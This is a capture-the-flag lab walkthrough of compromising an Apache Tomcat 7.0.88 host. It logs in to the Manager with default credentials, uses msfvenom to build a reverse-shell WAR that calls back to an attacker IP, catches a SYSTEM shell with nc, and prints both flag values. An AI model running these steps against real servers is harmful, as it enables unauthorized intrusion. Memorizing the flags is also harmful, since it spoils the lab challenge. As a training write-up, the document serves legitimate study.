# Flags
- User
	- 7004dbcef0f854e0fb401875f26ebd00
- Root
	- 04a8b36e1545a455393d067e772fe90e


# Notes
- Rustscan to start
```
rustscan --ulimit 5000 --addresses "10.129.4.25" --top -- -sC -sV
```
- We only got one result, which is Tomcat running on 8080
```
...
PORT     STATE SERVICE REASON          VERSION  
8080/tcp open  http    syn-ack ttl 127 Apache Tomcat/Coyote JSP engine 1.1  
|_http-title: Apache Tomcat/7.0.88  
|_http-favicon: Apache Tomcat  
| http-methods:    
|_  Supported Methods: GET HEAD POST OPTIONS  
|_http-server-header: Apache-Coyote/1.1
...
```
- Visting the IP and port, we are given the default Tomcat page telling us that the install was successful and its ready to go.
- It's noted that this is Apache Tomcat 7.0.88. This is also reflected in the rustscan results
- May not seem that important, but it could be a version with some known vulnerabilities we can use
- However, we can go into the Manager App by attempting known default credentials, in which we see that tomcat:s3cret worked.
- We can then see the Web App Manager, in which we can upload WAR files
- So, similar to how we have been doing the PHP shells, we can upload a WAR reverse shell file and then have it connect back to a listener on our attacker machine
- There's a lot of ways to do it, but we'll do the shortcut and have Metasploit's msfvenom do that for us:
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.15.4 LPORT=4444 -f war > reverse.war
```
- Once that is generated, we need to run strings to get the filename that it will change to once uploaded onto Tomcat:
```
[Jan 28, 2026 - 14:17:06 (PST)] exegol-htb-labs /workspace # strings reverse.war | grep jsp  
yqxydeujfwfk.jsp}T]k  
yqxydeujfwfk.jspPK
```
- Now with that, start up nc:
```
nc -lvnp 4444
```
- We can now upload it onto Tomcat and then access it to execute it.
- Sure enough, it worked great:
```
Ncat: Version 7.93 ( https://nmap.org/ncat )  
Ncat: Listening on :::4444  
Ncat: Listening on 0.0.0.0:4444  
Ncat: Connection from 10.129.4.25.  
Ncat: Connection from 10.129.4.25:49192.  
Microsoft Windows [Version 6.3.9600]  
(c) 2013 Microsoft Corporation. All rights reserved.  
  
C:\apache-tomcat-7.0.88>
```
- What is also cool that it drops us right into root as well, so we have all that we need to get the flags:
```
C:\Users>whoami  
whoami  
nt authority\system
```
- We can then get the user and root flags!
```
C:\Users\Administrator\Desktop\flags>type "2 for the price of 1.txt"  
type "2 for the price of 1.txt"  
user.txt  
7004dbcef0f854e0fb401875f26ebd00  
  
root.txt  
04a8b36e1545a455393d067e772fe90e
```
